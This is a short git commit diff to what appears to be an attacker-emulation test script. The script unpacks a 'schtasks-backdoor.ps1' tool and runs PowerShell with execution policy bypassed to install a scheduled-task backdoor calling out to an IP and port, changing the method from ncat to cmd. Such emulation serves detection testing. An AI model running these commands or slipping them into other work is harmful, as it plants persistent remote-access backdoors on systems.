ed50272409831dda302385f52659ed96550c4cae
Florian Roth <florian.roth@bsk-consulting.de>
2018-02-22 10:48:53 +0100

    Fixed bug in new schtasks test

--- test-sets/persistence/schtasks-xml.bat
+++ test-sets/persistence/schtasks-xml.bat
@@ -8,4 +8,4 @@ ping -n 5 127.0.0.1 > NUL
 
 "%ZIP%" e -p%PASS% %TOOLARCH% -aoa -o"%APTDIR%" toolset\schtasks-backdoor.ps1 > NUL
 
-powershell.exe -Exec ByPasS ". %APTDIR%\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method ncat -ip 8.8.8.8 -port 9999 -time 2"
+powershell.exe -Exec ByPasS ". %APTDIR%\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2"
